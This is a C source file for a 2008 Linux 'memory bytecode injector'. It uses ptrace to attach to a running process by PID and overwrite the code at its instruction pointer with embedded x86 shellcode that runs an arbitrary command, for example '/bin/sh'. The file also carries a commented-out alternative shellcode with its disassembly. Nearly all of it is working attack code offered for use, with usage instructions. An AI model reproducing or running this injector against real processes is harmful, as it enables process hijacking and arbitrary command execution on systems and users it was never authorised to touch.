/*
 * Memory bytecode injector
 * by BlackLight, copyleft 2008
 * Released under GPL licence 3.0
 *
 * This short application allows you to inject arbitrary
 * code into a running process (runned by a user with
 * your same privileges or less), hijacking its flow to
 * execute an arbitrary command (yes, it includes a
 * built-in shellcode generator too).
 *
 * Usage:
 * ./meminj -p <pid> -c <cmd>
 * Example:
 * ./meminj -p 1234 -c "/bin/sh"
 */
 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>
 
// the injected code simply execve the program
char code[] =
        "\x60\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x6e\x2f\x73"
        "\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x68\x2d\x63"
        "\x63\x63\x89\xe1\x52\xeb\x07\x51\x53\x89\xe1\xcd"
        "\x80\x61\xe8\xf4\xff\xff\xff";

/*
unsigned char shell[] = {
0xeb, 0x13,
0x5b,
0x89, 0xd9,
0x83, 0xc3, 0x08,
0x31, 0xd2,
0x31, 0xc0,
0xb0, 0x0b,
0xcd, 0x80,
0x31, 0xc0,
0x40,
0xcd, 0x80,
0xe8, 0xe8, 0xff, 0xff, 0xff
*/
/*
which is the code :
Disassembly of section .text:

08048074 <_start>:
 8048074:       eb 13                   jmp    8048089 <end>

08048076 <l1>:
 8048076:       5b                      pop    %ebx
 8048077:       89 d9                   mov    %ebx,%ecx
 8048079:       83 c3 08                add    $0x8,%ebx
 804807c:       31 d2                   xor    %edx,%edx
 804807e:       31 c0                   xor    %eax,%eax
 8048080:       b0 0b                   mov    $0xb,%al
 8048082:       cd 80                   int    $0x80
 8048084:       31 c0                   xor    %eax,%eax
 8048086:       40                      inc    %eax
 8048087:       cd 80                   int    $0x80

08048089 <end>:
 8048089:       e8 e8 ff ff ff          call   8048076 <l1>
*/
 
void banner()  {
        printf ("~~~~~~ Memory bytecode injector by BlackLight ~~~~~~\n"
                   "  ====      Released under GPL licence 3        ====\n\n");
}
 
void help()  {
        printf (" [-] Usage: %s -p <pid> -c <command>\n");
}
 
main(int argc, char **argv)  {
        int i,j,c,size,pid=0;
        char *cmd=NULL;
        struct user_regs_struct reg;
        char *buff;
 
        banner();
 
        while ((c=getopt(argc,argv,"p:c:"))>0)  {
                switch (c)  {
                        case 'p':
                                pid=atoi(optarg);
                                break;
 
                        case 'c':
                                cmd=strdup(optarg);
                                break;
 
                        default:
                                help();
                                exit(1);
                                break;
                }
        }
 
        if (!pid || !cmd)  {
                help();
                exit(1);
        }
 
        size = sizeof(code)+strlen(cmd)+2;
        buff = (char*) malloc(size);
        memset (buff,0x0,size);
        memcpy (buff,code,sizeof(code));
        memcpy (buff+sizeof(code)-1,cmd,strlen(cmd));
 
        ptrace (PTRACE_ATTACH,pid,0,0);
        wait ((int*) 0);
 
        ptrace (PTRACE_GETREGS,pid,0,&reg);
        printf (" [+] Writing EIP @ 0x%.8x, process %d\n",reg.eip, pid);
 
        for (i=0; i<size; i++)
                ptrace (PTRACE_POKETEXT, pid, reg.eip+i, *(int*) (buff+i));
 
        ptrace (PTRACE_DETACH,pid,0,0);
        free(buff);
}
